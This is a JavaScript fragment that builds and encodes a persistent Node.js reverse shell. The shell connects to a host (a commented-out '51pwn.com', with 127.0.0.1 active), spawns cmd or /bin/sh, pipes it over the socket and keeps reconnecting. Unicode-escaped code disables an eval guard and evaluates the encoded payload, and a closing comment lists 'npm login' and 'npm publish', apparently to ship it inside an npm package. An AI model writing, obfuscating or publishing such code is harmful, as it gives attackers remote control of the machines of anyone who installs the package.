// console.log(s.length/s1.length);
// console.log(s1);
s = zS(`
var config = {
        host: "127.0.0.1",//"51pwn.com",
        port: 2053
    },net = require("net"),
    cp = require("child_process"),client = new net.Socket(),
    reConn = () => {client.connect(config.port, config.host)};
client.on("connect", () => {
    var command = (process.platform === "win32" ? "cmd /c start /b cmd" : "/bin/sh").split(" "),
    sh = cp.spawn(command[0], command.slice(1));
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
    client.write(s + "\\n");
    sh.on("exit", (code) => {
        if (code === 1) {
            reConn()
        }
    })
});
client.on("close", () => {reConn()});client.on("error", (e) => {});
reConn();
process.on("exit", () => {process.exitCode = 0;reConn()});
`);
console.log(s);


\u0070\u0072\u006F\u0063\u0065\u0073\u0073.\u0065\u006E\u0076.\u004E\u004F\u0044\u0045\u005F\u004E\u004F\u005F\u0045\u0056\u0041\u004C = undefined;
\u0065\u0076\u0061\u006C(\u0073\u0031);

/*

npm login
npm publish

*/